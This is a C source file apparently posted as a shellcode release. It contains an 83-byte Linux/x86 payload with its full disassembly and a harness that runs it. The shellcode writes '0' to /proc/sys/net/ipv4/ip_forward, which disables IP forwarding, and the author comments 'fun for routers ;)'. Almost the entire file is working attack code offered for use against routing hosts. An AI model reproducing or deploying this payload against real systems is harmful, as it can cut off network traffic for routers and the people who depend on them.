/*
    In The Name of G0D

    Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit()
    Size : 83 Bytes

    fun for routers ;)

    Author : By Hamid Zamani (aka HAMIDx9)
    Member of ^^Ashiyane Digital Security Team^^


Disassembly of section .text:

08048054 <_start>:
 8048054:   31 c0                   xor    %eax,%eax
 8048056:   50                      push   %eax
 8048057:   68 77 61 72 64          push   $0x64726177
 804805c:   68 5f 66 6f 72          push   $0x726f665f
 8048061:   68 34 2f 69 70          push   $0x70692f34
 8048066:   68 2f 69 70 76          push   $0x7670692f
 804806b:   68 2f 6e 65 74          push   $0x74656e2f
 8048070:   68 73 79 73 2f          push   $0x2f737973
 8048075:   68 72 6f 63 2f          push   $0x2f636f72
 804807a:   66 68 2f 70             pushw  $0x702f
 804807e:   89 e3                   mov    %esp,%ebx
 8048080:   31 c9                   xor    %ecx,%ecx
 8048082:   b1 01                   mov    $0x1,%cl
 8048084:   b0 05                   mov    $0x5,%al
 8048086:   cd 80                   int    $0x80
 8048088:   89 c3                   mov    %eax,%ebx
 804808a:   31 c9                   xor    %ecx,%ecx
 804808c:   51                      push   %ecx
 804808d:   6a 30                   push   $0x30
 804808f:   89 e1                   mov    %esp,%ecx
 8048091:   31 d2                   xor    %edx,%edx
 8048093:   b2 01                   mov    $0x1,%dl
 8048095:   b0 04                   mov    $0x4,%al
 8048097:   cd 80                   int    $0x80
 8048099:   31 c0                   xor    %eax,%eax
 804809b:   83 c0 06                add    $0x6,%eax
 804809e:   cd 80                   int    $0x80
 80480a0:   31 c0                   xor    %eax,%eax
 80480a2:   40                      inc    %eax
 80480a3:   31 db                   xor    %ebx,%ebx
 80480a5:   cd 80                   int    $0x80
*/

#include <stdio.h>

int main(int argc,char **argv)
{

char shellcode[] = "\x31\xc0\x50\x68\x77\x61\x72\x64\x68"
                   "\x5f\x66\x6f\x72\x68\x34\x2f\x69\x70"
                   "\x68\x2f\x69\x70\x76\x68\x2f\x6e\x65"
                   "\x74\x68\x73\x79\x73\x2f\x68\x72\x6f"
                   "\x63\x2f\x66\x68\x2f\x70\x89\xe3\x31"
                   "\xc9\xb1\x01\xb0\x05\xcd\x80\x89\xc3"
                   "\x31\xc9\x51\x6a\x30\x89\xe1\x31\xd2"
                   "\xb2\x01\xb0\x04\xcd\x80\x31\xc0\x83"
                   "\xc0\x06\xcd\x80\x31\xc0\x40\x31\xdb"
                   "\xcd\x80";

     printf("Length: %d\n",strlen(shellcode));
     (*(void(*)()) shellcode)();

     return 0;
}